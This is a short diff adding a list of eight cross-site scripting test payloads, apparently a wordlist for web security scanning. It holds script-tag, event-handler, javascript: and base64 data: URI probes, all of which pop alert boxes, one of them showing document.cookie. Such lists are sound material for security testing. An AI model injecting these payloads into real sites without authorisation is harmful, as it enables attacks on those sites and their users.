@@ -1,0 +1,8 @@
+<script>alert('XSS')</script>
+<ScRiPt>alert(String.fromCharCode(88,83,83))</sCRiPt>
+"><script>alert(document.domain)</script>
+'><script>alert(document.cookie)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+javascript:alert(1)
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
